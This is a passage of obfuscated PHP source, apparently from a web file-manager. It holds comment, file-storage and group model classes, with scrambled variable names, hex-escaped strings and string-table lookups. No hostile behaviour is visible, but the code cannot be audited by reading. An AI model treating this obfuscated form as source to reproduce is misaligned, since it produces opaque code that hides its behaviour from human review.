$È¤¨ŸÈ«, $Ëëì¶ü¡[554] => $­¦§öÂÔ, $Ëëì¶ü¡[1984] => 0, $Ëëì¶ü¡[1983] => 0); return $this->add($—ß§—æ‹); } public function starTargetCount($üŒ°ûŒ¿, $—’ıèªÂ) { $«ÌÎ‰òé =& $_SERVER[º·Ï‹¥³]; $õßêòëâ = $—’ıèªÂ + self::TYPE_STAR_OFFSET; $©Úå¦¡Ğ = $this->commentCount($üŒ°ûŒ¿, $õßêòëâ); $ƒàÙÈ°¼ = $this->commentCount($üŒ°ûŒ¿, $õßêòëâ, USER_ID); return array($«ÌÎ‰òé[1986] => $©Úå¦¡Ğ, $«ÌÎ‰òé[1987] => $ƒàÙÈ°¼); } public function starTargetUserList($¥Ú”¼’õ, $æÃı¼•) { $‰„ÌÚ† =& $_SERVER[º·Ï‹¥³]; $çˆ¡Óé = $¥Ú”¼’õ + self::TYPE_STAR_OFFSET; $âœñ†äÊ = array($‰„ÌÚ†[554] => $æÃı¼•, $‰„ÌÚ†[181] => $çˆ¡Óé); $Ü¼®–ï† = $this->where($âœñ†äÊ)->count(); $éÉûñç½ = array($‰„ÌÚ†[307] => $Ü¼®–ï†, $‰„ÌÚ†[1988] => array()); if (!$Ü¼®–ï†) { return $éÉûñç½; } $ÈÉÂ„‚À = $this->field($‰„ÌÚ†[1754])->where($âœñ†äÊ)->limit(500)->select(); $ÈÉÂ„‚À = array_to_keyvalue($ÈÉÂ„‚À, $‰„ÌÚ†[12], $‰„ÌÚ†[1754]); $éÉûñç½[$‰„ÌÚ†[1988]] = Model($‰„ÌÚ†[562])->userListInfo($ÈÉÂ„‚À); return $éÉûñç½; } public function prasiseUserList($Ş ƒ™Õ») { $İŒ™–„¬ =& $_SERVER[º·Ï‹¥³]; $×ıŞ¨„‰ = array($İŒ™–„¬[1989] => $Ş ƒ™Õ»); $ÚÒÁ¸‹¥ = $this->where($×ıŞ¨„‰)->find(); $Õ×”ßÇØ = _get($ÚÒÁ¸‹¥, $İŒ™–„¬[1984], 0); $Ê¶¢ê = array($İŒ™–„¬[307] => $Õ×”ßÇØ, $İŒ™–„¬[1988] => array()); if (!$Õ×”ßÇØ) { return $Ê¶¢ê; } $ĞÖè‡Ó = Model($İŒ™–„¬[1990])->field($İŒ™–„¬[1754])->where($×ıŞ¨„‰)->limit(500)->select(); $ĞÖè‡Ó = array_to_keyvalue($ĞÖè‡Ó, $İŒ™–„¬[12], $İŒ™–„¬[1754]); $Ê¶¢ê[$İŒ™–„¬[1988]] = Model($İŒ™–„¬[562])->userListInfo($ĞÖè‡Ó); return $Ê¶¢ê; } public function remove($­Àü®”ğ) { $ˆ“¶É™İ =& $_SERVER[º·Ï‹¥³]; $¾¨»°Ò = array($ˆ“¶É™İ[1982] => $­Àü®”ğ); $€ÆÂİ• = $this->where($¾¨»°Ò)->find(); if ($€ÆÂİ•[$ˆ“¶É™İ[1981]]) { $this->where(array($ˆ“¶É™İ[1982] => $€ÆÂİ•[$ˆ“¶É™İ[1981]]))->setAdd($ˆ“¶É™İ[1983], -1); } return $this->where($¾¨»°Ò)->delete(); } public function edit($ÅüÃ˜€, $ñ®ŞıŠ) { $£’Î©´ö =& $_SERVER[º·Ï‹¥³]; $ËŞŠÍÎ = array($£’Î©´ö[1982] => $ÅüÃ˜€); return $this->where($ËŞŠÍÎ)->save(array($£’Î©´ö[1991] => $ñ®ŞıŠ)); } public function prasise($Ï³í‰™) { $¦©àš…Ï =& $_SERVER[º·Ï‹¥³]; $ÑÇÑòÏ´ = Model($¦©àš…Ï[1992]); $¯©íÑæÒ = array($¦©àš…Ï[1982] => $Ï³í‰™, $¦©àš…Ï[1745] => USER_ID); $«ä’—• = $ÑÇÑòÏ´->where($¯©íÑæÒ)->find(); if (!$«ä’—•) { $ÑÇÑòÏ´->add($¯©íÑæÒ); $Çê¬±´« = $this->where(array($¦©àš…Ï[1982] => $Ï³í‰™))->setAdd($¦©àš…Ï[1984], 1); } else { $ÑÇÑòÏ´->where($¯©íÑæÒ)->delete(); $Çê¬±´« = $this->where(array($¦©àš…Ï[1982] => $Ï³í‰™))->setAdd($¦©àš…Ï[1984], -1); } return $Çê¬±´«; } public function targetInfo($öƒ™É´·, $£…áÕ•Â) { $÷¸¶š€ =& $_SERVER[º·Ï‹¥³]; $çœãÏä = array($÷¸¶š€[632] => $öƒ™É´·, $÷¸¶š€[633] => $£…áÕ•Â); $Ü‹¨ = $this->where($çœãÏä)->count(); $í‰íıİ = "\122\111\107\x48\124\40\112\117\111\x4e\x20{$this->tablePrefix}\x63\x6f\155\155\145\x6e\x74\137\160\x72\x61\x69\x73\145\x20\x73\x74\x61\x72\40\157\x6e\40\x63\x6f\x6d\155\145\x6e\164\x2e\143\157\x6d\x6d\x65\156\164\111\x44\40\75\x20\x73\164\141\162\56\143\x6f\x6d\155\x65\x6e\x74\x49\x44"; $ôÚ¡Šáû = $this->alias($÷¸¶š€[405])->where($çœãÏä)->join($í‰íıİ, $÷¸¶š€[1993])->count(); $ÍÔ¨¶óö = array($÷¸¶š€[1994] => $Ü‹¨, $÷¸¶š€[1995] => $ôÚ¡Šáû); return $ÍÔ¨¶óö; } public function listData($Âå‰îƒ†) { $×­Êïä =& $_SERVER[º·Ï‹¥³]; if (isset($Âå‰îƒ†[$×­Êïä[1996]])) { if ($Âå‰îƒ†[$×­Êïä[1996]]) { $Âå‰îƒ†[$×­Êïä[1989]] = array($×­Êïä[1063], intval($Âå‰îƒ†[$×­Êïä[1996]])); } unset($Âå‰îƒ†[$×­Êïä[1996]]); } if (isset($Âå‰îƒ†[$×­Êïä[1997]])) { if ($Âå‰îƒ†[$×­Êïä[1997]]) { $Âå‰îƒ†[$×­Êïä[1989]] = array($×­Êïä[1060], intval($Âå‰îƒ†[$×­Êïä[1997]])); } unset($Âå‰îƒ†[$×­Êïä[1997]]); } return $this->_listData($Âå‰îƒ†); } private function _listData($Û¶à‘ˆ©) { $¾÷·Ê—õ =& $_SERVER[º·Ï‹¥³]; $Çç‰ÕË” = $this->where($Û¶à‘ˆ©)->_makeOrder()->selectPage(100); $this->_listAppendParent($Çç‰ÕË”[$¾÷·Ê—õ[429]]); $this->_listAppendUser($Çç‰ÕË”[$¾÷·Ê—õ[429]]); $this->_listAppendMeta($Çç‰ÕË”[$¾÷·Ê—õ[429]]); return $Çç‰ÕË”; } private function _makeOrder() { $™ŞÖÉûß =& $_SERVER[º·Ï‹¥³]; $™È¹ûÖŠ = array($™ŞÖÉûß[1984], $™ŞÖÉûß[1983], $™ŞÖÉûß[222]); $‘üèÚì = Input::get($™ŞÖÉûß[514], $™ŞÖÉûß[7], $™ŞÖÉûß[481], $™È¹ûÖŠ); $ë¹ç±Ÿ = Input::get($™ŞÖÉûß[515], $™ŞÖÉûß[7], $™ŞÖÉûß[1747], array($™ŞÖÉûß[1998], $™ŞÖÉûß[510])); $û½Æœ›Ø = $‘üèÚì . $™ŞÖÉûß[53] . $ë¹ç±Ÿ; return $this->order($û½Æœ›Ø); } private function _listAppendParent(&$Ò¢Õ‡Âù) { $ØŸæ’¶Â =& $_SERVER[º·Ï‹¥³]; $ˆñ®ôİ¾ = array_unique(array_to_keyvalue($Ò¢Õ‡Âù, $ØŸæ’¶Â[12], $ØŸæ’¶Â[1981])); $ˆñ®ôİ¾ = array_remove_value($ˆñ®ôİ¾, $ØŸæ’¶Â[219]); if (!$ˆñ®ôİ¾) { return; } $İÉ–òÛ = $this->where(array($ØŸæ’¶Â[1982] => array($ØŸæ’¶Â[7], $ˆñ®ôİ¾)))->select(); $İÉ–òÛ = array_to_keyvalue($İÉ–òÛ, $ØŸæ’¶Â[1989]); foreach ($Ò¢Õ‡Âù as &$è×©¿ Ë) { if (isset($İÉ–òÛ[$è×©¿ Ë[$ØŸæ’¶Â[1981]]])) { $è×©¿ Ë[$ØŸæ’¶Â[1999]] = $İÉ–òÛ[$è×©¿ Ë[$ØŸæ’¶Â[1981]]]; } } unset($è×©¿ Ë); } private function _listAppendUser(&$ûòíªüˆ) { $œô¾ŠêÙ =& $_SERVER[º·Ï‹¥³]; $§±§§å¥ = array_unique(array_to_keyvalue($ûòíªüˆ, $œô¾ŠêÙ[12], $œô¾ŠêÙ[1754])); $§±§§å¥ = array_remove_value($§±§§å¥, $œô¾ŠêÙ[219]); if (count($§±§§å¥) == 0) { return; } foreach ($ûòíªüˆ as $ãÂûŞŞù) { if (isset($ãÂûŞŞù[$œô¾ŠêÙ[1999]])) { $§±§§å¥[] = $ãÂûŞŞù[$œô¾ŠêÙ[1999]][$œô¾ŠêÙ[1754]]; } } $·©³úÇâ = Model($œô¾ŠêÙ[583])->userListInfo($§±§§å¥); foreach ($ûòíªüˆ as &$ãÂûŞŞù) { $ãÂûŞŞù[$œô¾ŠêÙ[646]] = $·©³úÇâ[$ãÂûŞŞù[$œô¾ŠêÙ[1754]]]; if (isset($ãÂûŞŞù[$œô¾ŠêÙ[1999]])) { $ãÂûŞŞù[$œô¾ŠêÙ[1999]][$œô¾ŠêÙ[646]] = $·©³úÇâ[$ãÂûŞŞù[$œô¾ŠêÙ[1999]][$œô¾ŠêÙ[1754]]]; } } unset($ãÂûŞŞù); } private function _listAppendMeta(&$·¡´°Ü) { $ê¬Ö»Œ =& $_SERVER[º·Ï‹¥³]; $Äøúá”ğ = array_unique(array_to_keyvalue($·¡´°Ü, $ê¬Ö»Œ[12], $ê¬Ö»Œ[1989])); $Äøúá”ğ = array_remove_value($Äøúá”ğ, $ê¬Ö»Œ[219]); if (!$Äøúá”ğ) { return; } foreach ($·¡´°Ü as $ÎÆºÅøù) { if (isset($ÎÆºÅøù[$ê¬Ö»Œ[1999]])) { $Äøúá”ğ[] = $ÎÆºÅøù[$ê¬Ö»Œ[1999]][$ê¬Ö»Œ[1989]]; } } $£ÚŞ›»î = $this->metaList($Äøúá”ğ); if (!$£ÚŞ›»î) { return !1; } foreach ($·¡´°Ü as &$ÎÆºÅøù) { $ÎÆºÅøù[$ê¬Ö»Œ[523]] = $£ÚŞ›»î[$ÎÆºÅøù[$ê¬Ö»Œ[1989]]]; if (isset($ÎÆºÅøù[$ê¬Ö»Œ[1999]])) { $ÎÆºÅøù[$ê¬Ö»Œ[1999]][$ê¬Ö»Œ[523]] = $£ÚŞ›»î[$ÎÆºÅøù[$ê¬Ö»Œ[1999]][$ê¬Ö»Œ[1989]]]; } } unset($ÎÆºÅøù); } private function metaList($³âŞàÇÍ) { $´¯Ñã§” =& $_SERVER[º·Ï‹¥³]; if (!$³âŞàÇÍ) { return array(); } $Ù¾„³Ê¾ = array($´¯Ñã§”[1989] => array($´¯Ñã§”[7], $³âŞàÇÍ)); $™€Û†Èë = Model($´¯Ñã§”[2000])->where($Ù¾„³Ê¾)->select(); $™€Û†Èë = array_to_keyvalue_group($™€Û†Èë, $´¯Ñã§”[1989]); foreach ($™€Û†Èë as $ïï‰ÜĞ => $ò‡à±œö) { $™àùš§Å = array(); foreach ($ò‡à±œö as $ £ïÊõ) { $™àùš§Å[$ £ïÊõ[$´¯Ñã§”[97]]] = $ £ïÊõ[$´¯Ñã§”[434]]; } $™€Û†Èë[$ïï‰ÜĞ] = $™àùš§Å; } return $™€Û†Èë ? $™€Û†Èë : array(); } public function removeTarget($Åó˜ıëü, $Ö©Ì„) { $€óÉÇŞ± =& $_SERVER[º·Ï‹¥³]; if (!$Ö©Ì„) { return !0; } $Ö©Ì„ = is_array($Ö©Ì„) ? $Ö©Ì„ : array($Ö©Ì„); $À©ÀÜİ— = array($€óÉÇŞ±[181] => $Åó˜ıëü, $€óÉÇŞ±[554] => array($€óÉÇŞ±[7], $Ö©Ì„)); $éïöÁĞ = $this->field($€óÉÇŞ±[1989])->where($À©ÀÜİ—)->select(); $»ÒÂÖ = array_to_keyvalue($éïöÁĞ, $€óÉÇŞ±[12], $€óÉÇŞ±[1989]); if (!$»ÒÂÖ) { return !0; } $À©ÀÜİ— = array($€óÉÇŞ±[1989] => array($€óÉÇŞ±[7], $»ÒÂÖ)); $this->where($À©ÀÜİ—)->delete(); Model($€óÉÇŞ±[1992])->where($À©ÀÜİ—)->delete(); Model($€óÉÇŞ±[2001])->where($À©ÀÜİ—)->delete(); } } goto AàßŠÛ©; AàßŠÛ©: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\154\x65\137\x63\157\156\x74\x65\x6e\164\163"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\x54\x69\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\x65\x72\164", "\x66\x75\156\x63\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\154\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\155\x65" => "\x69\157\x5f\x66\151\x6c\x65\x5f\155\x65\x74\x61", "\x6d\145\x74\x61\106\151\145\154\144" => "\x66\x69\154\145\111\104"); public function fileInfo($ŞşĞê‹) { $¦Ù·¢“Ê =& $_SERVER[º·Ï‹¥³]; static $Âëõ¬Ûå = array(); if (!isset($Âëõ¬Ûå[$ŞşĞê‹])) { $‰­»…‘Š = $¦Ù·¢“Ê[2002]; $ØúŸşİ = Model($¦Ù·¢“Ê[528])->field($‰­»…‘Š)->where(array($¦Ù·¢“Ê[526] => $ŞşĞê‹))->find(); $Âëõ¬Ûå[$ŞşĞê‹] = $ØúŸşİ; } return $Âëõ¬Ûå[$ŞşĞê‹]; } public function addFileByContent($ìÊ±Á·Á = '', $ìË¦üˆ¶ = '') { $±Üù÷ıç =& $_SERVER[º·Ï‹¥³]; $ÚÓŸ˜ƒ‰ = TEMP_PATH . $±Üù÷ıç[2003]; if (!is_dir($ÚÓŸ˜ƒ‰)) { mk_dir($ÚÓŸ˜ƒ‰); } $Ê”ËÎÄ§ = $ÚÓŸ˜ƒ‰ . $±Üù÷ıç[2004] . rand_string(16); file_put_contents($Ê”ËÎÄ§, $ìÊ±Á·Á); $§âÇÕÕ™ = $this->addFile($Ê”ËÎÄ§, $ìË¦üˆ¶, !0); if (file_exists($Ê”ËÎÄ§)) { @unlink($Ê”ËÎÄ§); } return $§âÇÕÕ™; } public function createFileName($äƒæÍŸ, $‚ø™¹êé = false, $Õêâø»Î = false) { $¨ı¢Ïóï =& $_SERVER[º·Ï‹¥³]; $Û«İŞõö = IO::init($¨ı¢Ïóï[8]); $ÃÑ©óÍ = $this->makeFilePath($äƒæÍŸ, $Û«İŞõö, $‚ø™¹êé, $Õêâø»Î); $ç’æïóõ = $Û«İŞõö->pathFather($ÃÑ©óÍ); static $¾Î´½·Ğ = false; $àæŸ¨Ñª = $¨ı¢Ïóï[2005] . md5($ç’æïóõ); if (!$¾Î´½·Ğ && !Cache::get($àæŸ¨Ñª)) { $¾Î´½·Ğ = !0; $Õˆ¹Í¸ = IO::mkdir($ç’æïóõ); if (!IO::exist($Õˆ¹Í¸ . $¨ı¢Ïóï[848])) { IO::mkfile($Õˆ¹Í¸ . $¨ı¢Ïóï[848]); } Cache::set($àæŸ¨Ñª, 1, 3600 * 2); } return $ÃÑ©óÍ; } public function makeFilePath($½•Ëáªò, $¾¯İä†±, $ËôœÀáÎ = false, $»ªÈî³é = false) { $åıàİ¸© =& $_SERVER[º·Ï‹¥³]; $ÓÉš´‘Ş = Model($åıàİ¸©[822])->get($åıàİ¸©[2006]); $³ËÕ²Òä = KodIO::defaultIO() . date($åıàİ¸©[2007]); $«Ö§¿ºÇ = $³ËÕ²Òä . rand_string(5) . short_id(100); $½•Ëáªò = str_replace($åıàİ¸©[8], $åıàİ¸©[11], KodIO::clear($½•Ëáªò)); $Œ „Ù·• = $¾¯İä†±->ext($½•Ëáªò); if (!$½•Ëáªò) { $ÓÉš´‘Ş = $åıàİ¸©[2008]; } switch ($ÓÉš´‘Ş) { case $åıàİ¸©[2009]: if ($Œ „Ù·•) { $«Ö§¿ºÇ = $«Ö§¿ºÇ . $åıàİ¸©[10] . $Œ „Ù·•; } if ($Œ „Ù·• == $åıàİ¸©[1945]) { $«Ö§¿ºÇ .= $åıàİ¸©[1259]; } break; case $åıàİ¸©[2010]: $Ç¹ûù« = Model($åıàİ¸©[822])->get($åıàİ¸©[823]); $ÅÚÖñÈ = substr(md5($åıàİ¸©[824] . $Ç¹ûù« . date($åıàİ¸©[800])), 0, 8); $‹ïÑì¯¹ = KodIO::defaultDriver(); $³ËÕ²Òä = $åıàİ¸©[1290] . $‹ïÑì¯¹[$åıàİ¸©[459]] . $åıàİ¸©[468] . date($åıàİ¸©[2011]) . $ÅÚÖñÈ . $åıàİ¸©[8]; if ($Œ „Ù·• == $åıàİ¸©[1945]) { $½•Ëáªò .= $åıàİ¸©[1259]; } $ª´Æ–‘… = $åıàİ¸©[2012] . $³ËÕ²Òä . $½•Ëáªò; CacheLock::lock($ª´Æ–‘…); $«Ö§¿ºÇ = $³ËÕ²Òä . $½•Ëáªò; if (IO::exist($³ËÕ²Òä . $½•Ëáªò)) { $Ù¤·©• = substr($½•Ëáªò, 0, strlen($½•Ëáªò) - strlen($Œ „Ù·•)); $î¾Ñï÷ = $»ªÈî³é ? substr($»ªÈî³é, 0, 5) : ($ËôœÀáÎ ? substr($ËôœÀáÎ, 0, 5) : rand_string(5)); $«Ö§¿ºÇ = $³ËÕ²Òä . $Ù¤·©• . $î¾Ñï÷; if ($Œ „Ù·•) { $«Ö§¿ºÇ = $«Ö§¿ºÇ . $åıàİ¸©[10] . $Œ „Ù·•; } } if (IO::isOsDriver($«Ö§¿ºÇ) && !IO::isUploadServer($«Ö§¿ºÇ)) { if (IO::exist($«Ö§¿ºÇ)) { return $«Ö§¿ºÇ; } $ñÑö¦ºÇ = IO::setContent($«Ö§¿ºÇ, $åıàİ¸©[12]); if (!$ñÑö¦ºÇ) { show_json($åıàİ¸©[2013], !1); } } CacheLock::unlock($ª´Æ–‘…); break; case $åıàİ¸©[2008]: break; default: break; } return $«Ö§¿ºÇ; } public function addFileByRemote($™ÖØ½ú, $à®º´³•, $İÒ»ãè = array()) { $šèø£å¤ =& $_SERVER[º·Ï‹¥³]; if (!IO::exist($™ÖØ½ú)) { return !1; } $Ğ´ëÎ‡ = $İÒ»ãè[$šèø£å¤[531]] ? $İÒ»ãè[$šèø£å¤[531]] : $šèø£å¤[12]; $‘¨¯õõè = IO::hashMd5($™ÖØ½ú, $Ğ´ëÎ‡); $£–‹‚± = KodIO::defaultDriver(); $¥í£‚ğ¼ = array($šèø£å¤[601] => IO::size($™ÖØ½ú), $šèø£å¤[2014] => 1, $šèø£å¤[478] => $à®º´³•, $šèø£å¤[859] => $£–‹‚±[$šèø£å¤[459]], $šèø£å¤[479] => $™ÖØ½ú, $šèø£å¤[2015] => $İÒ»ãè[$šèø£å¤[656]] ? $İÒ»ãè[$šèø£å¤[656]] : IO::hashSimple($™ÖØ½ú), $šèø£å¤[2016] => $‘¨¯õõè ? $‘¨¯õõè : $Ğ´ëÎ‡); if ($ä­½¾—Ä = $this->addFileCheckExist($¥í£‚ğ¼[$šèø£å¤[656]], $¥í£‚ğ¼[$šèø£å¤[531]], $¥í£‚ğ¼[$šèø£å¤[79]])) { return $ä­½¾—Ä; } return $this->addFileData($¥í£‚ğ¼); } private function addFileData($ÒõãÈ‹õ) { $‹à‡íÊÇ =& $_SERVER[º·Ï‹¥³]; if (!$ÒõãÈ‹õ) { return !1; } $ÒõãÈ‹õ[$‹à‡íÊÇ[79]] = intval($ÒõãÈ‹õ[$‹à‡íÊÇ[79]]); if (!$ÒõãÈ‹õ[$‹à‡íÊÇ[79]] && strlen($ÒõãÈ‹õ[$‹à‡íÊÇ[656]]) > 32) { $ÒõãÈ‹õ[$‹à‡íÊÇ[79]] = intval(substr($ÒõãÈ‹õ[$‹à‡íÊÇ[656]], 32)); } $¢ºúä = $this->add($ÒõãÈ‹õ); return $this->find($¢ºúä); } public function addFile($úí¿ÄË™, $—Ôı…ô…, $àŠÏÔ«è = false) { $ºùï‰ÌÒ =& $_SERVER[º·Ï‹¥³]; $À•—ÔÌË = IO::hashSimple($úí¿ÄË™); $ûÛ…¯¡ = IO::size($úí¿ÄË™); $×¨â›ĞŸ = $ûÛ…¯¡ <= 1024 * 1024 * 10 ? IO::hashMd5($úí¿ÄË™) : $ºùï‰ÌÒ[12]; $¤Ÿ•Ï—” = $ºùï‰ÌÒ[2017] . $À•—ÔÌË; CacheLock::lock($¤Ÿ•Ï—”); if ($×¨â›ĞŸ && $À•—ÔÌË) { $è“Õ£«˜ = $this->addFileCheckExist($À•—ÔÌË, $×¨â›ĞŸ, $ûÛ…¯¡); if ($è“Õ£«˜) { CacheLock::unlock($¤Ÿ•Ï—”); return $è“Õ£«˜; } } $î—Š««Œ = $this->addFileMake($úí¿ÄË™, $ûÛ…¯¡, $À•—ÔÌË, $×¨â›ĞŸ, $—Ôı…ô…, $àŠÏÔ«è); $ÒÓéÀÄ¨ = $this->addFileData($î—Š««Œ); CacheLock::unlock($¤Ÿ•Ï—”); if (!$×¨â›ĞŸ && $ÒÓéÀÄ¨) { $this->fileMd5Check($ÒÓéÀÄ¨); } return $ÒÓéÀÄ¨; } public function fileMd5Check($Úù“Ãˆğ) { $ïĞÈ¡’˜ =& $_SERVER[º·Ï‹¥³]; $äÀ³¥ü‹ = array($Úù“Ãˆğ[$ïĞÈ¡’˜[525]], $Úù“Ãˆğ[$ïĞÈ¡’˜[87]]); $ËÍ­›˜µ = $ïĞÈ¡’˜[2018] . $Úù“Ãˆğ[$ïĞÈ¡’˜[87]]; $Õ¾öş½Õ = $ïĞÈ¡’˜[2019] . $Úù“Ãˆğ[$ïĞÈ¡’˜[525]]; TaskQueue::add($ïĞÈ¡’˜[2020], $äÀ³¥ü‹, $ËÍ­›˜µ, $Õ¾öş½Õ); } public function fileMd5Set($Ú¼±ƒ¶, $Í¯ó­À) { $Á’Ï´Š« =& $_SERVER[º·Ï‹¥³]; $èå„§Î = $this->find($Ú¼±ƒ¶); if (!$èå„§Î || $èå„§Î[$Á’Ï´Š«[531]]) { return; } $ãÎĞ‡½ˆ = IO::hashMd5($Í¯ó­À); if (!$ãÎĞ‡½ˆ) { return $Á’Ï´Š«[12]; } $this->where(array($Á’Ï´Š«[525] => $Ú¼±ƒ¶))->save(array($Á’Ï´Š«[531] => $ãÎĞ‡½ˆ)); } public function addFileMake($öò•Ëë, $çğ‚Üã”, $ôÂê¥Æî, $ıÂ³³é†, $ëâğ×•, $ƒ«›¨€) { $²¨­®„¨ =& $_SERVER[º·Ï‹¥³]; $ÌÍŞ ² = $this->createFileName($ëâğ×•, $ôÂê¥Æî, $ıÂ³³é†); $‚ŸÁÑë = get_path_father($ÌÍŞ ²); $ò·ŒøÂ = get_path_this($ÌÍŞ ²); if ($ƒ«›¨€) { $·Õ¹€ì = IO::move($öò•Ëë, $‚ŸÁÑë, !1, $ò·ŒøÂ); } else { $·Õ¹€ì = IO::copy($öò•Ëë, $‚ŸÁÑë, !1, $ò·ŒøÂ); } if (!$·Õ¹€ì) { return !1; } $´ôíÊ†€ = KodIO::defaultDriver(); $›Ü™›Ñµ = array($²¨­®„¨[601] => $çğ‚Üã”, $²¨­®„¨[2014] => 1, $²¨­®„¨[478] => $ëâğ×•, $²¨­®„¨[859] => $´ôíÊ†€[$²¨­®„¨[459]], $²¨­®„¨[479] => $ÌÍŞ ², $²¨­®„¨[2015] => $ôÂê¥Æî, $²¨­®„¨[2016] => $ıÂ³³é†); return $›Ü™›Ñµ; } public function addFileCheckExist($¯‹ğ®ªŸ, $ã‡ã°ø…, $ÕùõÊçˆ) { $åğà“ı =& $_SERVER[º·Ï‹¥³]; $âÆÛµĞ = $this->findByHash($¯‹ğ®ªŸ, $ã‡ã°ø…); if (!$âÆÛµĞ) { return !1; } $şœÆŒÕ = array($åğà“ı[2014] => intval($âÆÛµĞ[$åğà“ı[2021]]) + 1, $åğà“ı[601] => $ÕùõÊçˆ); $this->where(array($åğà“ı[526] => $âÆÛµĞ[$åğà“ı[525]]))->save($şœÆŒÕ); return $âÆÛµĞ; } public function remove($àĞÃÙ„î) { $this->linkCountChange($àĞÃÙ„î, !1); $this->clearEmpty(); return !0; } public function linkAdd($£õ €óó) { $this->linkCountChange($£õ €óó, !0); } public function linkCountChange($ıº®ûğ„, $ÕØ’¦çÔ) { $—Àó’Õù =& $_SERVER[º·Ï‹¥³]; if (!$ıº®ûğ„) { return; } if (!is_array($ıº®ûğ„)) { $ıº®ûğ„ = array($ıº®ûğ„); } $ÖÄ°²âÃ = array(); foreach ($ıº®ûğ„ as $ˆÀ‘µ±á) { $Õ«àœ¦ı = $ˆÀ‘µ±á . $—Àó’Õù[12]; if (!$ÖÄ°²âÃ[$Õ«àœ¦ı]) { $ÖÄ°²âÃ[$Õ«àœ¦ı] = 0; } $ÖÄ°²âÃ[$Õ«àœ¦ı]++; } $ëÂÏö÷ö = array(); foreach ($ÖÄ°²âÃ as $ˆÀ‘µ±á => $Ó¼‰Ç°ˆ) { $Õ«àœ¦ı = $Ó¼‰Ç°ˆ . $—Àó’Õù[12]; if (!$ëÂÏö÷ö[$Õ«àœ¦ı]) { $ëÂÏö÷ö[$Õ«àœ¦ı] = array(); } $ëÂÏö÷ö[$Õ«àœ¦ı][] = $ˆÀ‘µ±á; } foreach ($ëÂÏö÷ö as $Ó¼‰Ç°ˆ => $óá¹€ú‹) { if (!$óá¹€ú‹) { continue; } $Ó¼‰Ç°ˆ = $ÕØ’¦çÔ ? $Ó¼‰Ç°ˆ : -intval($Ó¼‰Ç°ˆ); $èáêŸ¾® = array($—Àó’Õù[525] => array($—Àó’Õù[7], $óá¹€ú‹)); if ($Ó¼‰Ç°ˆ < 0) { $èáêŸ¾®[$—Àó’Õù[2021]] = array($—Àó’Õù[1064], abs($Ó¼‰Ç°ˆ)); } $this->where($èáêŸ¾®)->setAdd($—Àó’Õù[2021], $Ó¼‰Ç°ˆ); } } public function findByHash($±íø‘íê, $‚ò Š¿– = false) { $ôİ¥î”É =& $_SERVER[º·Ï‹¥³]; if (!$±íø‘íê && !$‚ò Š¿–) { return !1; } $ÙÌë±Ãò = array($ôİ¥î”É[2015] => $±íø‘íê); if ($‚ò Š¿–) { $ÙÌë±Ãò = array($ôİ¥î”É[2016] => $‚ò Š¿–); } return $this->order($ôİ¥î”É[2022])->where($ÙÌë±Ãò)->find(); } public function clearEmpty($åŒ˜ÍïÓ = 0) { $ğõ÷ìšä =& $_SERVER[º·Ï‹¥³]; $¬èÚ³…ª = time() - 3600 * 24 * $åŒ˜ÍïÓ; $÷çåñ»¢ = $ğõ÷ìšä[2023] . $¬èÚ³…ª; $¥†âô°Û = $this->where($÷çåñ»¢)->select(); if (!$¥†âô°Û) { return; } $ÅıÑ¹³º = new Task($ğõ÷ìšä[2024], $ğõ÷ìšä[12], count($¥†âô°Û)); foreach ($¥†âô°Û as $á¢˜·Ü) { $ÅıÑ¹³º->update(1); $this->resetFile($á¢˜·Ü); } $ÅıÑ¹³º->end(); } public function resetFile($Úˆä•ş) { $áİ¥úæÈ =& $_SERVER[º·Ï‹¥³]; $ê‡ë§ª— = array($áİ¥úæÈ[526] => $Úˆä•ş[$áİ¥úæÈ[525]]); $™éûÜÑ = Model($áİ¥úæÈ[1388])->where($ê‡ë§ª—)->count(); $áµ¥›Ç = Model($áİ¥úæÈ[2025])->where($ê‡ë§ª—)->count(); $¥³Œ¬½ = intval($™éûÜÑ) + intval($áµ¥›Ç); if ($¥³Œ¬½ == 0) { IO::remove($Úˆä•ş[$áİ¥úæÈ[87]]); Model($áİ¥úæÈ[2026])->delete($Úˆä•ş[$áİ¥úæÈ[525]]); $this->where($ê‡ë§ª—)->delete(); $this->metaSet($Úˆä•ş[$áİ¥úæÈ[525]], null, null); write_log(ACTION . $áİ¥úæÈ[2027] . KodUser::id() . $áİ¥úæÈ[2028] . $Úˆä•ş[$áİ¥úæÈ[525]] . $áİ¥úæÈ[2029] . $Úˆä•ş[$áİ¥úæÈ[79]] . $áİ¥úæÈ[192] . $Úˆä•ş[$áİ¥úæÈ[87]], $áİ¥úæÈ[2030]); return; } if ($Úˆä•ş[$áİ¥úæÈ[2021]] != $¥³Œ¬½) { $this->where($ê‡ë§ª—)->save(array($áİ¥úæÈ[2014] => $¥³Œ¬½)); } } public function storageInfo($‹µï™È = false) { $ñ—Š½´Ø =& $_SERVER[º·Ï‹¥³]; $¬’í÷Ä = $this->count() + 0.0; $•Ûô´  = 0; $ÌÔ’Ïğé = 1; $•¨ëùÌá = 0; $ˆåŒ­ÊÖ = 5000; for ($¢©¸ğÑ´ = 0; $¢©¸ğÑ´ < $¬’í÷Ä; $¢©¸ğÑ´ = $¢©¸ğÑ´ + $ˆåŒ­ÊÖ) { $·ÔˆŠ„İ = $this->limit($¢©¸ğÑ´, $¢©¸ğÑ´ + $ˆåŒ­ÊÖ)->select(); foreach ($·ÔˆŠ„İ as $­üŠìò) { $ÌÔ’Ïğé += $­üŠìò[$ñ—Š½´Ø[79]] * $­üŠìò[$ñ—Š½´Ø[2021]]; $•Ûô´  += $­üŠìò[$ñ—Š½´Ø[79]] * ($­üŠìò[$ñ—Š½´Ø[2021]] - 1); $•¨ëùÌá += $­üŠìò[$ñ—Š½´Ø[2021]]; } } $èŠ§°­¿ = array($ñ—Š½´Ø[2031] => $ÌÔ’Ïğé, $ñ—Š½´Ø[2032] => $•Ûô´ , $ñ—Š½´Ø[2033] => $•Ûô´  / $ÌÔ’Ïğé, $ñ—Š½´Ø[83] => $¬’í÷Ä, $ñ—Š½´Ø[2034] => $•¨ëùÌá); return $èŠ§°­¿; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\141\x6d\x65" => "\x67\x72\x6f\x75\160\137\x6d\145\x74\141", 